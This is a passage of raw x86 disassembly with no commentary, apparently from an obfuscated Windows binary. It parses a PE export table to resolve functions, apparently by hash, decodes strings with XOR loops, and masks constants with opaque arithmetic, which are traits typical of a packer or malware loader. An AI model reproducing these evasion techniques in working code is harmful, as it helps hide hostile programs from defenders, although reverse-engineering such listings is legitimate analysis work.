  427eea:	call   0x427c7c
  427eef:	mov    DWORD PTR [ebp-0x10],eax
  427ef2:	test   eax,eax
  427ef4:	je     0x427fa7
  427efa:	mov    ecx,DWORD PTR [eax+0x3c]
  427efd:	push   ebx
  427efe:	push   esi
  427eff:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  427f03:	add    esi,eax
  427f05:	mov    edi,DWORD PTR [esi+0x24]
  427f08:	mov    ecx,DWORD PTR [esi+0x1c]
  427f0b:	mov    edx,DWORD PTR [esi+0x20]
  427f0e:	mov    ebx,DWORD PTR [esi+0x18]
  427f11:	add    edi,eax
  427f13:	mov    DWORD PTR [ebp-0x20],edi
  427f16:	mov    edi,DWORD PTR [esi+0x14]
  427f19:	add    ecx,eax
  427f1b:	add    edx,eax
  427f1d:	mov    DWORD PTR [ebp-0xc],ecx
  427f20:	mov    DWORD PTR [ebp-0x1c],edx
  427f23:	mov    DWORD PTR [ebp-0x8],edi
  427f26:	cmp    edi,ebx
  427f28:	ja     0x427f2d
  427f2a:	mov    DWORD PTR [ebp-0x8],ebx
  427f2d:	xor    ebx,ebx
  427f2f:	mov    DWORD PTR [ebp-0x18],ebx
  427f32:	cmp    DWORD PTR [ebp-0x8],ebx
  427f35:	jbe    0x427fa5
  427f37:	jmp    0x427f3c
  427f39:	mov    edx,DWORD PTR [ebp-0x1c]
  427f3c:	mov    edi,DWORD PTR [ebp-0x20]
  427f3f:	movzx  edi,WORD PTR [edi+ebx*2]
  427f43:	cmp    ebx,DWORD PTR [esi+0x18]
  427f46:	jae    0x427fa5
  427f48:	cmp    edi,DWORD PTR [esi+0x14]
  427f4b:	jae    0x427fa5
  427f4d:	mov    ebx,DWORD PTR [edx+ebx*4]
  427f50:	mov    edx,DWORD PTR [ebp+0x8]
  427f53:	mov    edi,DWORD PTR [ecx+edi*4]
  427f56:	mov    DWORD PTR [ebp-0x4],edx
  427f59:	lea    edx,[ebp-0x50]
  427f5c:	add    ebx,eax
  427f5e:	add    edi,eax
  427f60:	sub    edx,DWORD PTR [ebp+0x8]
  427f63:	mov    DWORD PTR [ebp-0x14],0xb
  427f6a:	mov    DWORD PTR [ebp-0x24],edx
  427f6d:	mov    edx,DWORD PTR [ebp-0x4]
  427f70:	cmp    DWORD PTR [edx],0x0
  427f73:	jne    0x427f90
  427f75:	mov    eax,DWORD PTR [ebp-0x24]
  427f78:	push   DWORD PTR [eax+edx*1]
  427f7b:	push   ebx
  427f7c:	call   0x427d76
  427f81:	mov    ecx,DWORD PTR [ebp-0xc]
  427f84:	test   eax,eax
  427f86:	je     0x427f8d
  427f88:	mov    eax,DWORD PTR [ebp-0x4]
  427f8b:	mov    DWORD PTR [eax],edi
  427f8d:	mov    eax,DWORD PTR [ebp-0x10]
  427f90:	add    DWORD PTR [ebp-0x4],0x4
  427f94:	dec    DWORD PTR [ebp-0x14]
  427f97:	jne    0x427f6d
  427f99:	mov    ebx,DWORD PTR [ebp-0x18]
  427f9c:	inc    ebx
  427f9d:	mov    DWORD PTR [ebp-0x18],ebx
  427fa0:	cmp    ebx,DWORD PTR [ebp-0x8]
  427fa3:	jb     0x427f39
  427fa5:	pop    esi
  427fa6:	pop    ebx
  427fa7:	pop    edi
  427fa8:	leave  
  427fa9:	ret    0x4
  427fac:	push   ebp
  427fad:	mov    ebp,esp
  427faf:	mov    eax,DWORD PTR [ebp+0x8]
  427fb2:	push   esi
  427fb3:	push   DWORD PTR [eax+0x1e0]
  427fb9:	lea    esi,[eax+0x198]
  427fbf:	mov    eax,DWORD PTR [ebp+0x8]
  427fc2:	call   0x427e5b
  427fc7:	mov    ecx,DWORD PTR [esi]
  427fc9:	mov    DWORD PTR [ecx],eax
  427fcb:	mov    eax,DWORD PTR [esi]
  427fcd:	xor    ecx,ecx
  427fcf:	cmp    DWORD PTR [eax],ecx
  427fd1:	pop    esi
  427fd2:	setne  cl
  427fd5:	mov    eax,ecx
  427fd7:	pop    ebp
  427fd8:	ret    0x4
  427fdb:	mov    ecx,DWORD PTR [edi+0x188]
  427fe1:	push   ebx
  427fe2:	jmp    0x427ff7
  427fe4:	xor    eax,0x8a98
  427fe9:	add    eax,0x3b5a
  427fee:	mov    WORD PTR [ecx],ax
  427ff1:	add    ecx,0x2
  427ff4:	add    edx,0x2
  427ff7:	movzx  eax,WORD PTR [edx]
  427ffa:	mov    ebx,0x4e3e
  427fff:	cmp    ax,bx
  428002:	jne    0x427fe4
  428004:	xor    eax,eax
  428006:	mov    WORD PTR [ecx],ax
  428009:	mov    eax,DWORD PTR [edi+0x188]
  42800f:	pop    ebx
  428010:	ret    
  428011:	push   edi
  428012:	mov    edi,eax
  428014:	mov    eax,DWORD PTR [esi+0x188]
  42801a:	shl    edi,0x6
  42801d:	add    eax,edi
  42801f:	jmp    0x42802a
  428021:	xor    cl,0x7c
  428024:	inc    cl
  428026:	mov    BYTE PTR [eax],cl
  428028:	inc    eax
  428029:	inc    edx
  42802a:	mov    cl,BYTE PTR [edx]
  42802c:	cmp    cl,0x83
  42802f:	jne    0x428021
  428031:	mov    BYTE PTR [eax],0x0
  428034:	mov    eax,DWORD PTR [esi+0x188]
  42803a:	add    eax,edi
  42803c:	pop    edi
  42803d:	ret    
  42803e:	push   ebp
  42803f:	mov    ebp,esp
  428041:	sub    esp,0x14
  428044:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42804b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428052:	mov    eax,DWORD PTR [ebx]
  428054:	mov    DWORD PTR [ebp-0x8],eax
  428057:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42805e:	push   esi
  42805f:	push   edi
  428060:	mov    DWORD PTR [ebp-0x14],0xead71885
  428067:	mov    edi,DWORD PTR [ebp-0x4]
  42806a:	mov    ecx,DWORD PTR [ebp-0x10]
  42806d:	mov    eax,0x75108aa
  428072:	xor    edi,eax
  428074:	mov    edx,0x3272f1
  428079:	xor    ecx,eax
  42807b:	add    edi,edx
  42807d:	add    ecx,edx
  42807f:	imul   edi,ecx
  428082:	jmp    0x4280ca
  428084:	mov    ecx,DWORD PTR [ebp-0x8]
  428087:	mov    esi,DWORD PTR [ebp-0x4]
  42808a:	xor    ecx,eax
  42808c:	xor    esi,eax
  42808e:	add    ecx,edx
  428090:	add    esi,edx
  428092:	test   esi,ecx
  428094:	mov    esi,DWORD PTR [ebp-0x8]
  428097:	mov    ecx,DWORD PTR [ebp-0x4]
  42809a:	je     0x4280b1
  42809c:	xor    ecx,eax
  42809e:	xor    esi,eax
  4280a0:	add    ecx,edx
  4280a2:	add    esi,edx
  4280a4:	shr    esi,cl
  4280a6:	mov    ecx,DWORD PTR [ebp-0x14]
  4280a9:	xor    ecx,eax
  4280ab:	add    ecx,edx
  4280ad:	xor    esi,ecx
  4280af:	jmp    0x4280bb
  4280b1:	xor    esi,eax
  4280b3:	xor    ecx,eax
  4280b5:	add    esi,edx
  4280b7:	add    ecx,edx
  4280b9:	shr    esi,cl
  4280bb:	mov    DWORD PTR [ebp-0x8],esi
  4280be:	mov    ecx,DWORD PTR [ebp-0x4]
  4280c1:	xor    ecx,eax
  4280c3:	lea    edi,[edi+ecx*1+0x3272f1]
  4280ca:	mov    ecx,DWORD PTR [ebp-0xc]
  4280cd:	mov    esi,DWORD PTR [ebp-0x4]
  4280d0:	xor    esi,eax
  4280d2:	xor    ecx,eax
  4280d4:	sub    ecx,esi
  4280d6:	cmp    edi,ecx
  4280d8:	jbe    0x428084
  4280da:	mov    eax,DWORD PTR [ebp-0x8]
  4280dd:	pop    edi
  4280de:	mov    DWORD PTR [ebx],eax
  4280e0:	mov    eax,DWORD PTR [ebp-0x8]
  4280e3:	pop    esi
  4280e4:	leave  
  4280e5:	ret    
  4280e6:	push   ebp
  4280e7:	mov    ebp,esp
  4280e9:	sub    esp,0x38
  4280ec:	push   ebx
  4280ed:	mov    ebx,0xf89c85a5
  4280f2:	mov    DWORD PTR [ebp-0x4],ebx
  4280f5:	lea    ecx,[ebx+0x15]
  4280f8:	mov    DWORD PTR [ebp-0x24],ecx
  4280fb:	mov    eax,DWORD PTR [ebp-0x4]
  4280fe:	mov    edx,DWORD PTR [ebp+0x8]
  428101:	push   esi
  428102:	mov    esi,0x75108aa
  428107:	xor    eax,esi
  428109:	push   edi
  42810a:	mov    edi,0x3272f1
  42810f:	add    eax,edi
  428111:	cmp    edx,eax
  428113:	mov    eax,DWORD PTR [ebp-0x4]
  428116:	je     0x42827a
  42811c:	mov    edx,DWORD PTR [ebp+0xc]
  42811f:	xor    eax,esi
  428121:	add    eax,edi
  428123:	cmp    edx,eax
  428125:	je     0x428277
  42812b:	mov    eax,DWORD PTR [ebp+0x10]
  42812e:	mov    edx,DWORD PTR [ebp+0xc]
  428131:	mov    DWORD PTR [ebp-0x14],eax
  428134:	mov    eax,DWORD PTR [ebp+0x8]
  428137:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42813e:	mov    DWORD PTR [ebp-0xc],eax
  428141:	lea    eax,[ebx+0x16]
  428144:	mov    DWORD PTR [ebp-0x1c],eax
  428147:	mov    DWORD PTR [ebp-0x10],ebx
  42814a:	mov    DWORD PTR [ebp+0xc],ecx
  42814d:	mov    DWORD PTR [ebp+0x10],eax
  428150:	mov    eax,DWORD PTR [ebp+0xc]
  428153:	xor    eax,esi
  428155:	mov    DWORD PTR [ebp-0x20],edx
  428158:	sub    edx,eax
  42815a:	sub    edx,edi
  42815c:	mov    DWORD PTR [ebp+0x8],edx
  42815f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428166:	jmp    0x428267
  42816b:	mov    eax,DWORD PTR [ebp+0xc]
  42816e:	mov    ecx,DWORD PTR [ebp+0xc]
  428171:	xor    eax,esi
  428173:	xor    ecx,esi
  428175:	lea    ecx,[eax+ecx*1+0x64e5e2]
  42817c:	mov    eax,DWORD PTR [ebp+0x8]
  42817f:	xor    edx,edx
  428181:	div    ecx
  428183:	mov    eax,DWORD PTR [ebp+0x10]
  428186:	mov    ecx,DWORD PTR [ebp+0xc]
  428189:	xor    eax,esi
  42818b:	xor    ecx,esi
  42818d:	sub    eax,ecx
  42818f:	cmp    edx,eax
  428191:	jne    0x428226
  428197:	mov    eax,DWORD PTR [ebp+0x8]
  42819a:	mov    ecx,DWORD PTR [ebp-0xc]
  42819d:	mov    dl,BYTE PTR [eax+ecx*1]
  4281a0:	mov    eax,DWORD PTR [ebp-0x10]
  4281a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4281a6:	xor    eax,esi
  4281a8:	xor    ecx,esi
  4281aa:	add    eax,edi
  4281ac:	add    ecx,edi
  4281ae:	cmp    eax,ecx
  4281b0:	jae    0x4281f8
  4281b2:	lea    ecx,[eax-0x3272f1]
  4281b8:	mov    DWORD PTR [ebp-0x4],ecx
  4281bb:	mov    ebx,DWORD PTR [ebp-0x4]
  4281be:	xor    ebx,esi
  4281c0:	add    ebx,0x7f55d8fb
  4281c6:	lea    ecx,[ebp+eax*4-0x38]
  4281ca:	mov    DWORD PTR [ecx],ebx
  4281cc:	mov    ebx,DWORD PTR [ecx]
  4281ce:	cmp    ebx,0x244ecb98
  4281d4:	jbe    0x4281de
  4281d6:	add    DWORD PTR [ecx],0x405fcd9
  4281dc:	jmp    0x4281e4
  4281de:	add    DWORD PTR [ecx],0xfdaf4327
  4281e4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281e7:	xor    ecx,esi
  4281e9:	inc    eax
  4281ea:	inc    DWORD PTR [ebp-0x4]
  4281ed:	add    ecx,edi
  4281ef:	cmp    eax,ecx
  4281f1:	jb     0x4281bb
  4281f3:	mov    ebx,0xf89c85a5
  4281f8:	cmp    DWORD PTR [ebp-0x14],0x0
  4281fc:	jne    0x428205
  4281fe:	xor    dl,0x7c
  428201:	inc    dl
  428203:	jmp    0x42821b
  428205:	mov    eax,DWORD PTR [ebp-0x18]
  428208:	xor    al,0xaa
  42820a:	mov    cl,0xf
  42820c:	sub    cl,al
  42820e:	add    dl,cl
  428210:	mov    ecx,DWORD PTR [ebp-0x1c]
  428213:	xor    cl,0xaa
  428216:	sub    cl,0xf
  428219:	ror    dl,cl
  42821b:	xor    eax,eax
  42821d:	mov    eax,DWORD PTR [ebp+0x8]
  428220:	mov    ecx,DWORD PTR [ebp-0xc]
  428223:	mov    BYTE PTR [eax+ecx*1],dl
  428226:	mov    eax,DWORD PTR [ebp+0x8]
  428229:	mov    ecx,DWORD PTR [ebp-0x10]
  42822c:	sub    eax,edi
  42822e:	xor    eax,esi
  428230:	cmp    eax,ecx
  428232:	jne    0x428255
  428234:	mov    eax,DWORD PTR [ebp+0x10]
  428237:	mov    ecx,DWORD PTR [ebp+0xc]
  42823a:	xor    eax,esi
  42823c:	xor    ecx,esi
  42823e:	sub    eax,ecx
  428240:	mov    ecx,DWORD PTR [ebp-0x20]
  428243:	sub    eax,edi
  428245:	xor    eax,esi
  428247:	mov    DWORD PTR [ebp+0x10],eax
  42824a:	mov    eax,DWORD PTR [ebp+0xc]
  42824d:	xor    eax,esi
  42824f:	sub    ecx,eax
  428251:	sub    ecx,edi
  428253:	jmp    0x428264
  428255:	mov    eax,DWORD PTR [ebp+0xc]
  428258:	xor    eax,esi
  42825a:	mov    ecx,0xffcd8d0f
  42825f:	sub    ecx,eax
  428261:	add    ecx,DWORD PTR [ebp+0x8]
  428264:	mov    DWORD PTR [ebp+0x8],ecx
  428267:	mov    eax,DWORD PTR [ebp+0x10]
  42826a:	cmp    eax,ebx
  42826c:	jne    0x42816b
  428272:	mov    eax,DWORD PTR [ebp-0x24]
  428275:	jmp    0x42827a
  428277:	mov    eax,DWORD PTR [ebp-0x4]
  42827a:	xor    eax,esi
  42827c:	add    eax,edi
  42827e:	pop    edi
  42827f:	pop    esi
  428280:	pop    ebx
  428281:	leave  
  428282:	ret    0xc
  428285:	push   ebp
  428286:	mov    ebp,esp
  428288:	sub    esp,0x420
  42828e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428295:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  42829c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4282a3:	push   ebx
  4282a4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4282ab:	mov    eax,DWORD PTR [ebp-0x14]
  4282ae:	push   esi
  4282af:	mov    esi,0x75108aa
  4282b4:	push   edi
  4282b5:	xor    eax,esi
  4282b7:	mov    edi,0x3272f1
  4282bc:	add    eax,edi
  4282be:	mov    DWORD PTR [ebp-0x8],eax
  4282c1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4282c8:	mov    DWORD PTR [ebp-0x4],0xead71885
  4282cf:	mov    DWORD PTR [ebp-0x10],0x8
  4282d6:	mov    ecx,ecx
  4282d8:	mov    eax,DWORD PTR [ebp-0xc]
  4282db:	mov    ecx,DWORD PTR [ebp-0x14]
  4282de:	xor    eax,esi
  4282e0:	xor    ecx,esi
  4282e2:	add    eax,edi
  4282e4:	add    ecx,edi
  4282e6:	imul   eax,ecx
  4282e9:	jmp    0x42831c
  4282eb:	mov    eax,DWORD PTR [ebp-0x4]
  4282ee:	sub    eax,edi
  4282f0:	xor    eax,esi
  4282f2:	mov    DWORD PTR [ebp-0x8],eax
  4282f5:	lea    ebx,[ebp-0x8]
  4282f8:	call   0x42803e
  4282fd:	mov    DWORD PTR [ebp-0x8],eax
  428300:	mov    eax,DWORD PTR [ebp-0x8]
  428303:	mov    ecx,DWORD PTR [ebp-0x4]
  428306:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42830d:	mov    eax,DWORD PTR [ebp-0xc]
  428310:	mov    ecx,DWORD PTR [ebp-0x4]
  428313:	xor    eax,esi
  428315:	lea    eax,[eax+ecx*1+0x3272f1]
  42831c:	mov    DWORD PTR [ebp-0x4],eax
  42831f:	mov    eax,DWORD PTR [ebp-0x18]
  428322:	mov    ecx,DWORD PTR [ebp-0xc]
  428325:	xor    ecx,esi
  428327:	xor    eax,esi
  428329:	sub    eax,ecx
  42832b:	mov    ecx,DWORD PTR [ebp-0x4]
  42832e:	cmp    ecx,eax
  428330:	jbe    0x4282eb
  428332:	mov    eax,DWORD PTR [ebp-0x1c]
  428335:	xor    eax,esi
  428337:	add    eax,edi
  428339:	mov    DWORD PTR [ebp-0x8],eax
  42833c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428343:	mov    ebx,ebx
  428345:	jmp    0x4283a8
  428347:	mov    ecx,DWORD PTR [ebp-0x20]
  42834a:	mov    eax,DWORD PTR [ebp-0x8]
  42834d:	xor    ecx,esi
  42834f:	add    ecx,edi
  428351:	shr    eax,cl
  428353:	mov    DWORD PTR [ebp-0x4],eax
  428356:	mov    eax,DWORD PTR [ebp+0x8]
  428359:	mov    cl,BYTE PTR [eax]
  42835b:	mov    BYTE PTR [ebp+0xb],cl
  42835e:	mov    cl,BYTE PTR [ebp+0xb]
  428361:	mov    edx,DWORD PTR [ebp-0x8]
  428364:	movzx  ecx,cl
  428367:	xor    ecx,edx
  428369:	mov    DWORD PTR [ebp+0x8],ecx
  42836c:	mov    ecx,DWORD PTR [ebp-0x18]
  42836f:	mov    edx,DWORD PTR [ebp+0x8]
  428372:	xor    ecx,esi
  428374:	add    ecx,edi
  428376:	and    ecx,edx
  428378:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42837f:	mov    edx,DWORD PTR [ebp-0x4]
  428382:	xor    ecx,edx
  428384:	mov    DWORD PTR [ebp-0x8],ecx
  428387:	mov    ecx,DWORD PTR [ebp-0xc]
  42838a:	xor    ecx,esi
  42838c:	lea    eax,[eax+ecx*1+0x3272f1]
  428393:	mov    DWORD PTR [ebp+0x8],eax
  428396:	mov    eax,DWORD PTR [ebp-0xc]
  428399:	xor    eax,esi
  42839b:	mov    ecx,0xffcd8d0f
  4283a0:	sub    ecx,eax
  4283a2:	add    ecx,DWORD PTR [ebp-0x10]
  4283a5:	mov    DWORD PTR [ebp-0x10],ecx
  4283a8:	mov    eax,DWORD PTR [ebp-0x14]
  4283ab:	mov    ecx,DWORD PTR [ebp-0x10]
  4283ae:	xor    eax,esi
  4283b0:	add    eax,edi
  4283b2:	cmp    ecx,eax
  4283b4:	jne    0x428347
  4283b6:	mov    eax,DWORD PTR [ebp-0x1c]
  4283b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4283bc:	xor    eax,esi
  4283be:	add    eax,edi
  4283c0:	pop    edi
  4283c1:	pop    esi
  4283c2:	xor    eax,ecx
  4283c4:	pop    ebx
  4283c5:	leave  
  4283c6:	ret    0x4
  4283c9:	push   ebp
  4283ca:	mov    ebp,esp
  4283cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4283cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4283d2:	mov    edx,DWORD PTR [ebp+0x10]
  4283d5:	mov    eax,DWORD PTR [eax+0x190]
  4283db:	mov    eax,DWORD PTR [eax]
  4283dd:	sub    esp,0x64
  4283e0:	push   ebx
  4283e1:	push   esi
  4283e2:	push   edi
  4283e3:	mov    edi,0x75108aa
  4283e8:	xor    ecx,edi
  4283ea:	mov    ebx,0x3272f1
  4283ef:	add    ecx,ebx
  4283f1:	cmp    ecx,edx
  4283f3:	jne    0x428404
  4283f5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  4283ff:	jmp    0x428900
  428404:	mov    ecx,DWORD PTR [ebp+0x8]
  428407:	mov    esi,DWORD PTR [ebp+0x14]
  42840a:	mov    edx,DWORD PTR [esi]
  42840c:	xor    ecx,edi
  42840e:	add    ecx,ebx
  428410:	cmp    edx,ecx
  428412:	je     0x4288bb
  428418:	mov    ecx,DWORD PTR [ebp+0x1c]
  42841b:	mov    DWORD PTR [ebp-0x1c],eax
  42841e:	mov    DWORD PTR [ebp+0x1c],ecx
  428421:	mov    ecx,DWORD PTR [ebp+0x18]
  428424:	mov    eax,DWORD PTR [esi]
  428426:	mov    DWORD PTR [ebp-0x20],eax
  428429:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428430:	mov    edx,0xf89c85ba
  428435:	mov    DWORD PTR [ebp-0x8],edx
  428438:	mov    eax,DWORD PTR [ebp+0x1c]
  42843b:	mov    DWORD PTR [ebp+0x1c],eax
  42843e:	mov    eax,DWORD PTR [ebp+0x1c]
  428441:	mov    eax,DWORD PTR [eax+0x190]
  428447:	mov    eax,DWORD PTR [eax]
  428449:	mov    DWORD PTR [ebp-0x24],ecx
  42844c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42844f:	mov    ecx,DWORD PTR [ecx+0x190]
  428455:	mov    ecx,DWORD PTR [ecx]
  428457:	add    ecx,DWORD PTR [eax+0x3c]
  42845a:	mov    DWORD PTR [ebp+0x10],ecx
  42845d:	mov    eax,DWORD PTR [ebp+0x8]
  428460:	xor    eax,edi
  428462:	add    eax,ebx
  428464:	mov    DWORD PTR [ebp-0x4],eax
  428467:	mov    eax,DWORD PTR [ebp+0x8]
  42846a:	xor    eax,edi
  42846c:	add    eax,ebx
  42846e:	mov    DWORD PTR [ebp+0x18],eax
  428471:	mov    eax,DWORD PTR [ebp+0x10]
  428474:	mov    eax,DWORD PTR [eax+0x50]
  428477:	sub    eax,0xc
  42847a:	mov    DWORD PTR [ebp-0x28],eax
  42847d:	mov    eax,DWORD PTR [ebp+0x10]
  428480:	mov    eax,DWORD PTR [eax+0x38]
  428483:	mov    ecx,DWORD PTR [ebp+0x10]
  428486:	dec    eax
  428487:	test   DWORD PTR [ecx+0x54],eax
  42848a:	mov    eax,DWORD PTR [ebp+0x10]
  42848d:	je     0x4284a7
  42848f:	mov    eax,DWORD PTR [eax+0x38]
  428492:	mov    ecx,DWORD PTR [ebp+0x10]
  428495:	mov    ecx,DWORD PTR [ecx+0x54]
  428498:	dec    eax
  428499:	not    eax
  42849b:	and    ecx,eax
  42849d:	mov    eax,DWORD PTR [ebp+0x10]
  4284a0:	mov    eax,DWORD PTR [eax+0x38]
  4284a3:	add    eax,ecx
  4284a5:	jmp    0x4284aa
  4284a7:	mov    eax,DWORD PTR [eax+0x54]
  4284aa:	mov    DWORD PTR [ebp+0x1c],eax
  4284ad:	mov    eax,DWORD PTR [ebp+0x8]
  4284b0:	xor    eax,edi
  4284b2:	add    eax,ebx
  4284b4:	mov    DWORD PTR [ebp+0x18],eax
  4284b7:	mov    eax,DWORD PTR [ebp+0x8]
  4284ba:	xor    eax,edi
  4284bc:	add    eax,ebx
  4284be:	mov    DWORD PTR [ebp+0x18],eax
  4284c1:	mov    eax,DWORD PTR [ebp+0x8]
  4284c4:	mov    ecx,DWORD PTR [ebp-0x24]
  4284c7:	xor    eax,edi
  4284c9:	add    eax,ebx
  4284cb:	mov    DWORD PTR [ecx],eax
  4284cd:	mov    DWORD PTR [ebp+0x18],edx
  4284d0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  4284d7:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  4284de:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  4284e5:	mov    eax,DWORD PTR [ebp-0x8]
  4284e8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4284eb:	xor    eax,edi
  4284ed:	add    eax,ebx
  4284ef:	imul   eax,ecx
  4284f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4284f5:	mov    edx,DWORD PTR [ebp-0x28]
  4284f8:	xor    ecx,edi
  4284fa:	lea    ecx,[ecx+edx*1+0x3272f1]
  428501:	cmp    eax,ecx
  428503:	jae    0x4288b4
  428509:	mov    eax,DWORD PTR [ebp+0x8]
  42850c:	xor    eax,edi
  42850e:	add    eax,ebx
  428510:	mov    DWORD PTR [ebp+0x18],eax
  428513:	mov    eax,DWORD PTR [ebp+0x1c]
  428516:	add    eax,DWORD PTR [ebp-0x1c]
  428519:	mov    DWORD PTR [ebp-0x4],eax
  42851c:	push   DWORD PTR [ebp-0x4]
  42851f:	mov    esi,DWORD PTR [ebp-0x1c]
  428522:	mov    ecx,DWORD PTR [ebp+0x10]
  428525:	call   0x427679
  42852a:	mov    DWORD PTR [ebp+0xc],eax
  42852d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428534:	mov    eax,DWORD PTR [ebp-0x18]
  428537:	xor    eax,edi
  428539:	lea    ecx,[ebp-0x40]
  42853c:	add    eax,ebx
  42853e:	push   ecx
  42853f:	call   0x427c0b
  428544:	mov    eax,DWORD PTR [ebp+0xc]
  428547:	test   eax,eax
  428549:	je     0x428599
  42854b:	mov    eax,DWORD PTR [ebp-0x18]
  42854e:	xor    eax,edi
  428550:	add    eax,ebx
  428552:	push   eax
  428553:	push   DWORD PTR [ebp+0xc]
  428556:	lea    eax,[ebp-0x40]
  428559:	push   eax
  42855a:	call   0x427b01
  42855f:	mov    eax,DWORD PTR [ebp-0x4]
  428562:	mov    DWORD PTR [ebp-0x18],eax
  428565:	mov    eax,DWORD PTR [ebp-0x18]
  428568:	mov    ecx,DWORD PTR [ebp-0x1c]
  42856b:	sub    eax,ecx
  42856d:	mov    DWORD PTR [ebp-0x18],eax
  428570:	mov    eax,DWORD PTR [ebp+0xc]
  428573:	mov    ecx,DWORD PTR [ebp+0xc]
  428576:	mov    eax,DWORD PTR [eax+0x10]
  428579:	add    eax,DWORD PTR [ecx+0xc]
  42857c:	mov    ecx,DWORD PTR [ebp-0x18]
  42857f:	cmp    ecx,eax
  428581:	jb     0x428599
  428583:	mov    eax,DWORD PTR [ebp+0xc]
  428586:	mov    eax,DWORD PTR [eax+0xc]
  428589:	mov    ecx,DWORD PTR [ebp+0xc]
  42858c:	add    eax,DWORD PTR [ecx+0x8]
  42858f:	mov    ecx,DWORD PTR [ebp-0x18]
  428592:	sub    eax,ecx
  428594:	jmp    0x428887
  428599:	push   0xc
  42859b:	push   DWORD PTR [ebp-0x4]
  42859e:	lea    eax,[ebp-0x4c]
  4285a1:	push   eax
  4285a2:	call   0x427b01
  4285a7:	mov    eax,0xf89c85a5
  4285ac:	mov    DWORD PTR [ebp-0x2c],eax
  4285af:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4285b6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4285bd:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  4285c4:	lea    ecx,[ebp-0x2c]
  4285c7:	mov    DWORD PTR [ebp-0xc],ecx
  4285ca:	lea    ecx,[ebp-0x30]
  4285cd:	mov    DWORD PTR [ebp-0x10],ecx
  4285d0:	lea    ecx,[ebp-0x34]
  4285d3:	mov    DWORD PTR [ebp+0xc],ecx
  4285d6:	lea    ecx,[ebp-0x38]
  4285d9:	mov    DWORD PTR [ebp-0x14],ecx
  4285dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4285df:	xor    ecx,edi
  4285e1:	add    ecx,ebx
  4285e3:	mov    DWORD PTR [ebp-0x18],ecx
  4285e6:	jmp    0x4287e2
  4285eb:	cmp    eax,0xf89c85bb
  4285f0:	je     0x4287f4
  4285f6:	mov    ecx,DWORD PTR [ebp-0x8]
  4285f9:	xor    ecx,edi
  4285fb:	mov    esi,eax
  4285fd:	add    ecx,ebx
  4285ff:	mov    DWORD PTR [ebp+0x18],ecx
  428602:	mov    eax,DWORD PTR [ebp-0x18]
  428605:	xor    esi,edi
  428607:	lea    eax,[eax+esi*1+0x3272f1]
  42860e:	mov    DWORD PTR [ebp-0x18],eax
  428611:	mov    eax,DWORD PTR [ebp-0x8]
  428614:	mov    ecx,DWORD PTR [ebp-0x18]
  428617:	xor    eax,edi
  428619:	add    eax,ebx
  42861b:	cmp    ecx,eax
  42861d:	jne    0x428632
  42861f:	mov    eax,DWORD PTR [ebp+0x8]
  428622:	xor    eax,edi
  428624:	add    eax,ebx
  428626:	push   eax
  428627:	push   0xc
  428629:	lea    eax,[ebp-0x4c]
  42862c:	push   eax
  42862d:	call   0x4280e6
  428632:	mov    eax,DWORD PTR [ebp-0xc]
  428635:	mov    eax,DWORD PTR [eax]
  428637:	xor    eax,edi
  428639:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428640:	mov    ecx,DWORD PTR [ebp+0x8]
  428643:	xor    ecx,edi
  428645:	movzx  eax,al
  428648:	add    ecx,ebx
  42864a:	cmp    eax,ecx
  42864c:	je     0x4287ca
  428652:	mov    eax,DWORD PTR [ebp-0x10]
  428655:	mov    eax,DWORD PTR [eax]
  428657:	xor    eax,edi
  428659:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428660:	mov    ecx,DWORD PTR [ebp+0x8]
  428663:	xor    ecx,edi
  428665:	movzx  eax,al
  428668:	add    ecx,ebx
  42866a:	cmp    eax,ecx
  42866c:	je     0x4287ca
  428672:	mov    eax,DWORD PTR [ebp+0xc]
  428675:	mov    eax,DWORD PTR [eax]
  428677:	xor    eax,edi
  428679:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428680:	mov    ecx,DWORD PTR [ebp+0x8]
  428683:	xor    ecx,edi
  428685:	movzx  eax,al
  428688:	add    ecx,ebx
  42868a:	cmp    eax,ecx
  42868c:	je     0x4287ca
  428692:	mov    eax,DWORD PTR [ebp-0x14]
  428695:	mov    eax,DWORD PTR [eax]
  428697:	xor    eax,edi
  428699:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4286a3:	xor    ecx,edi
  4286a5:	movzx  eax,al
  4286a8:	add    ecx,ebx
  4286aa:	cmp    eax,ecx
  4286ac:	je     0x4287ca
  4286b2:	mov    eax,DWORD PTR [ebp-0x10]
  4286b5:	mov    eax,DWORD PTR [eax]
  4286b7:	xor    eax,edi
  4286b9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4286c0:	mov    ecx,DWORD PTR [ebp-0xc]
